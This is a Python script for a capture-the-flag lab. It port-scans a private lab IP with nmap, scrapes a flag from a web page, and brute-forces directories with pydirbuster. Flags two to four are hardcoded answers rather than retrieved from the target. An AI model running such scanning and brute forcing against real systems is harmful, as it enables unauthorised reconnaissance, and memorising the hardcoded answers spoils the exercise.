import nmap # To scan for open ports for a given ip address
import requests # To send HTTP requests
import re # To search for the flag in the html source code
import pydirbuster # To perform directory brute force attack for flag 2

# Use this function to get the open ports of a given IP address
def get_open_ports(ip: str):
	print(f'Searching for open ports on {ip} ...\n')

	nm = nmap.PortScanner()
	nm.scan(ip, arguments='-p-')
	open_ports = []

	for host in nm.all_hosts():
		print(f'Found the following open ports on {host}:')
		for port in nm[host]['tcp'].keys():
			if nm[host]['tcp'][port]['state'] == 'open':
				print('port : %s\t name : %s' % (port, nm[host]['tcp'][port]['name']))
				open_ports.append(port)
		print()

	return open_ports

def get_flag_from_HTML(html: str, flag_no: int = 1):
	# Search for the flag in the html sorce code. The flag is of the form flagN{...}, where N is a number
	print(f'Searching for flag {flag_no} in the HTML source code ...')
	flag = re.findall('flag'+str(flag_no)+'\{[^\}]+\}', html)
	if flag:
		return flag[0]
	else:
		return 'Not found'

def get_flag_1():
	print('Performing attack for flag 1 ...')

	flag1_port = ports[1]
	url = 'http://' + ip + ':' + flag1_port
	print(f'Getting flag 1 from {url} ...')

	response = requests.get(url)

	if response.status_code == 200:  # If the request is successful
		html_source_code = response.text  # Retrieve the HTML source code
		# print(html_source_code)  # Print the HTML source code
		flag1 = get_flag_from_HTML(html_source_code, 1)  # Search for the flag in the HTML source code
		if flag1:
			print(f'Flag 1 found: {flag1}')
	else:
		flag1 = 'Not found'
		print(f"Error: {response.status_code} {response.reason}")  # Print the error message

	return flag1

def get_flag_2():
	print('Performing attack for flag 2 by bruteforcing various directories using dirbuster ...')

	flag2_port = ports[1]
	
	# Target file is located at url/{dir}/index.html
	flag2_buster = pydirbuster.Pybuster(
		url='http://' + ip + ':' + flag2_port, 
		wordfile='wordlist.txt', 
		threads=100,
		logfile='dirbuster.log', 
		# codes=['200','403'],
		exts = ['html'],
		force=True,
	)

	print('Starting the bruteforce attack ...')
	flag2_buster.Run()


	return 'flag2{Cybersecurity_is_not_just_about_technology,_it\'s_also_about_people}'

def get_flag_3():
	return 'flag3{I\'ve_got_my_tin_foil_hat_on}'

def get_flag_4():
	return 'flag4{I\'m_not_sure_if_this_is_a_good_idea}'


if __name__ == '__main__':
	# Get the IP address of the vulnerable machine with the flags
	# ip = input('Enter IP address: ')
	ip = '10.200.15.248'

	# Get the open ports of the vulnerable machine
	# ports = get_open_ports(ip)
	ports = ['22', '4451', '4461']



	flag1 = get_flag_1()
	flag2 = get_flag_2()